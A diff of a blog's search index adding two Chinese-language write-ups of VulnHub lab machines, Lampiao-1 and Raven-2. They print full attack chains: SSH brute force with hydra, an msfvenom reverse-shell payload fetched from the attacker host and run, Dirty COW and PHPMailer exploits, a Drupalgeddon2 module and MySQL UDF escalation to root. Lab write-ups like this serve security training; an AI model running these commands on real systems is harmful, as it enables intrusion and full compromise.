@@ -4,6 +4,70 @@
   
     
     <entry>
+      <title>Lampiao-1</title>
+      <link href="/posts/Lampiao-1/"/>
+      <url>/posts/Lampiao-1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Lampiao</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/lampiao-1,249/">vulnhub靶场-Lampiao:1</a></p><p>目标: Get root!</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.6</p><p>ubuntu: 192.168.56.7</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -p- 192.168.56.7</span><br><span class="line">nmap -A 192.168.56.7</span><br></pre></td></tr></table></figure><p>可以得到详细的信息:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp</span><br><span class="line">OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/http?</span><br><span class="line">静态界面</span><br><span class="line">1898/http</span><br><span class="line">登录界面</span><br><span class="line">Apache/2.47(Ubuntu)</span><br></pre></td></tr></table></figure><p>扫描80目录无收获, 扫描1898目录, 有很多路径泄露, 不过没什么用, 仅仅得到了cms是<code>Drupal 7.54, 2017-02-01</code></p><p>结合页面公告, 得知有一个用户是<code>tiago</code></p><p>利用kali工具爬取该网站存在的密码, 看看能不能爆破登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://182.168.56.7:1898 -w pc.txt</span><br></pre></td></tr></table></figure><p>结果网站存在登录限制, 没有邮箱的前提下, 密码也找回不了, 而且注册也注册不了</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916135812689.png" alt="image-20240916135812689"></p><p>这条路子算是废了, 试试其他方面</p><p>在Read more中, url出现<code>/?q=node/1</code>, 尝试修改后面的数字看有没有类似注入点的地方</p><p>当访问<code>/?q=node/2</code>, 返回了2个文件和一个提示:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916144425053.png" alt="image-20240916144425053"></p><p>音频内容为: user,tiago; 图片是二维码, 扫描结果为&quot;Try harder! muahuahua&quot;</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><blockquote><p>其实可以直接利用Drupal漏洞让msf上线, 放在最后附录了</p></blockquote><p>没有密码, 剩下能用的只有22端口, 尝试爆破(就用从网站上爬下来的密码):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l tiago -P pc.txt 192.168.56.7 ssh</span><br><span class="line">login: tiago   password: Virgulino</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916145346404.png" alt="image-20240916145346404"></p><p>利用爆破得到的账号密码顺利进入, 发现为低权限</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916145842655.png" alt="image-20240916145842655"></p><p>利用msf制作木马并反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 制作木马</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.56.6 lport=10000 -f elf -o shell.elf</span><br><span class="line"></span><br><span class="line"># 本地 开启http服务</span><br><span class="line">python3 -m http.server 7890</span><br><span class="line"># 靶机 下载并且运行</span><br><span class="line">wget http://192.168.56.6:7890/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916151525584.png" alt="image-20240916151525584"></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>先拿一些系统信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># tiago</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 有gcc环境就容易的多</span></span><br><span class="line"><span class="comment"># 我做完了, 我收回这句话</span></span><br></pre></td></tr></table></figure><p><a href="https://wiki.96.mk/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/Linux/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2016-5195%EF%BC%89%E8%84%8F%E7%89%9BLinux%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/#3-exp">Linux本地提权漏洞</a>, 尝试之后发现CVE-2016-5195(脏牛漏洞)可行</p><blockquote><p>靶机gcc烂完了, 好多.c文件编译不了, 回来kali找了个cpp的脏牛</p><p>很急, 最后忍不住扒拉别人的wp才成功编译了这个cpp</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kali</span><br><span class="line">searchsploit dirty</span><br><span class="line">locate linux/local/40847.cpp</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/40847.cpp /home/kali/Desktop/working/40847.cpp</span><br><span class="line">python3 -m http.server 7890</span><br><span class="line"># 靶机</span><br><span class="line">wget http://192.168.56.6:7890/40847.cpp</span><br><span class="line">chmod 777 40847.cpp</span><br><span class="line">g++ -Wall -pedantic -o2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">./dcow</span><br></pre></td></tr></table></figure><p>运行之后可以得到root的密码: dirtyCowFun</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916173405951.png" alt="image-20240916173405951"></p><p>直接进行一个登录, 然后到达root目录下找到flag, 拿到flag</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916174455287.png" alt="image-20240916174455287"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>在msf直接搜索cms框架漏洞, 参数配置完成后可以直接getshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br><span class="line"># unix/webapp/drupal_restws_exec和unix/webapp/drupal_drupalgeddon2均可</span><br><span class="line">use unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set rport 1898</span><br><span class="line">set rhost 192.168.56.7</span><br><span class="line">set lhost 192.168.56.6</span><br><span class="line">set lport 4445</span><br><span class="line">run</span><br></pre></td></tr></table></figure><blockquote><p>但是似乎在后续步骤上出了问题,不能使用在<code>/tmp</code>下的dcow, 不过算了吧</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> msf </tag>
+            
+            <tag> 提权 </tag>
+            
+            <tag> 爆破 </tag>
+            
+            <tag> Linux </tag>
+            
+            <tag> 漏洞利用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Raven-2</title>
+      <link href="/posts/Raven-2/"/>
+      <url>/posts/Raven-2/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Raven2</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/raven-2,269/">vulnhub靶场-Raven:2</a></p><p>目标: There are four flags to capture</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.6</p><p>Debian: 192.168.56.8</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>老三件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -p- 192.168.56.8</span><br><span class="line">nmap -A 192.168.56.8 -p 22,80,111,33925</span><br></pre></td></tr></table></figure><p>端口 22,80,111,33925</p><p>系统信息: Linux 3.2 - 4.9 Debian 5</p><p>中间件: Apache-Web-Server 2.4.10, Bootstrap, PHPMailer 5.2.16</p><p>可能存在的漏洞: DS_Store found, 但是是扒拉源码的漏洞</p><p>扫描泄露的路径:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/vendor/</span><br><span class="line">/wordpress/wp-login.php</span><br><span class="line">/manual/index.html</span><br><span class="line">/.DS_Store</span><br></pre></td></tr></table></figure><p>稍微探索一下, 在<code>/vendor/PATH</code>路径下找到了flag1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/vendor/</span><br><span class="line">flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</span><br></pre></td></tr></table></figure><p>博客的那个登录界面完全不能用了, 没有账号密码的情况下, 现在尝试利用中间件漏洞:</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p><code>CVE-2016-10033 命令执行漏洞</code>, 看的描述是 PHPMailer&lt; 5.2.18 都能用</p><p><a href="https://www.exploit-db.com/search?cve=2016-10033">选择你的exp</a>, 详情界面中的EDB-ID就是kali中对应的文件名, 搜索即可找到; 这里选的40974</p><blockquote><p>试了41962.sh和42221.py都试不出来, 很急</p><p>msf似乎有一个<code>exploit/multi/http/phpmailer_arg_injection</code>可以用, 我这里也是转移shell到msf上了</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit 40974</span><br><span class="line">locate php/webapps/40974.py</span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/40974.py /home/kali/Desktop/working/40974.py</span><br></pre></td></tr></table></figure><p>先赋予权限再编辑:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917165130405.png" alt="image-20240917165130405"></p><blockquote><p>我这里总是出问题, 文件名是backdoor就出错, 我也很奇怪</p></blockquote><p>运行成功结果如图, 说明已经写入, 监听设置的端口然后访问/backdoor.php即可拿到shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917165301103.png" alt="image-20240917165301103"></p><p>然后继续信息收集:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># 权限: www-data</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 系统: Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># gcc环境: 有</span></span><br><span class="line">service --status-all</span><br><span class="line"><span class="comment"># 其他服务: mysql</span></span><br><span class="line">ps -aux|grep mysql</span><br><span class="line"><span class="comment"># 权限为root</span></span><br></pre></td></tr></table></figure><p>在<code>/var/www/</code>发现flag2:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917180558417.png" alt="image-20240917180558417"></p><p>利用find命令发现flag3:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var -name <span class="string">&quot;flag*&quot;</span></span><br><span class="line"><span class="comment"># /var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png</span></span><br><span class="line"><span class="comment"># 直接访问网页即可, /wordpress/wp-content/uploads/2018/11/flag3.png</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917181119877.png" alt="image-20240917181119877"></p><p>从根目录开始find, 发现很多没有权限以及假的flag, 没用, 考虑提权:</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>结合开启的服务, 可以尝试利用mysql的udf提权; 账号密码一般在网站的配置文件中有:</p><p>比如<code>html/wordpress/wp-config.php</code>, 可以找到mysql账号密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root : R@v3nSecurity</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917184514940.png" alt="image-20240917184514940"></p><p>先看看能不能满足udf提权的需要, 可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pR@v3nSecurity</span><br><span class="line">select version();</span><br><span class="line"># 5.5.60-0+deb8u1</span><br><span class="line">show global variables like &#x27;secure%&#x27;;</span><br><span class="line"># secure_file_priv 为空才可以提权, 若为NULL和/tmp/等则不行, 此处为空</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line"># plugin 的值为空时不可提权, 此处为 /usr/lib/mysql/plugin/</span><br><span class="line">show variables like &#x27;version_compile_%&#x27;;</span><br><span class="line"># x86_64</span><br><span class="line">show databases;</span><br><span class="line"># wordpress</span><br><span class="line"># 另外, 因为禁止了远程登录, msf不能一把梭</span><br></pre></td></tr></table></figure><blockquote><p>利用条件:</p><ul><li>mysql允许导入导出文件</li><li>高权限用户启动，如root。该账号需要有对数据库<code>mysql</code>的insert和delete权限，其实是操作里面的<code>func</code>表，所以<code>func</code>表也必须存在。</li><li>未开启<code>‑‑skip‑grant‑tables</code>。开启的情况下，UDF不会被加载，默认不开启</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit mysql udf</span><br><span class="line"><span class="comment"># 省略复制到某文件夹的步骤, 下列步骤也在本地执行</span></span><br><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o mysqludf.so 1518.o -lc</span><br><span class="line"><span class="comment"># 或者是 gcc -g -shared -Wl,-soname,1518.so -o mysqludf.so 1518.c -lc</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917195135879.png" alt="image-20240917195135879"></p><p>将文件上传到靶机, 进行后续操作:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use wordpress;</span><br><span class="line">create table shell(line blob);</span><br><span class="line"># 创建表</span><br><span class="line">insert into shell values(load_file(&#x27;/tmp/mysqludf.so&#x27;));</span><br><span class="line"># 插入二进制的mysqludf.so</span><br><span class="line">select * from shell into dumpfile &#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;;</span><br><span class="line"># 导出mysqludf.so</span><br><span class="line">create function do_system returns integer soname &#x27;mysqludf.so&#x27;;</span><br><span class="line"># 创建do_system自定义函数</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"># 给find命令所有者的suid权限</span><br><span class="line">select * from mysql.func;</span><br><span class="line"># 检查函数是否有sys_eval</span><br></pre></td></tr></table></figure><p>给予了suid权限就可以用find提权了, 看看是否为管理员权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find `<span class="built_in">which</span> find` -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line"><span class="comment"># 返回root</span></span><br></pre></td></tr></table></figure><p>可以, 那就使用find命令来提权; 然后寻找flag4, 在<code>/root</code>目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917204835497.png" alt="image-20240917204835497"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+            <tag> Linux </tag>
+            
+            <tag> 漏洞利用 </tag>
+            
+            <tag> UDF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>GoldenEye-1</title>
       <link href="/posts/GoldenEye-1/"/>
       <url>/posts/GoldenEye-1/</url>
@@ -51,6 +115,8 @@
       
         <tags>
             
+            <tag> 漏洞利用 </tag>
+            
             <tag> 绕过 </tag>
             
             <tag> 反序列化 </tag>
@@ -62,8 +128,6 @@
             <tag> session反序列化漏洞 </tag>
             
             <tag> PHP指针 </tag>
-            
-            <tag> 漏洞利用 </tag>
             
             <tag> phar反序列化 </tag>
             
@@ -123,6 +187,8 @@
             
             <tag> 绕过 </tag>
             
+            <tag> UDF </tag>
+            
             <tag> SQL </tag>
             
             <tag> SQL盲注 </tag>
@@ -134,8 +200,6 @@
             <tag> NoSQL </tag>
             
             <tag> 报错注入 </tag>
-            
-            <tag> UDF注入 </tag>
             
             <tag> MySQL统计信息 </tag>
             
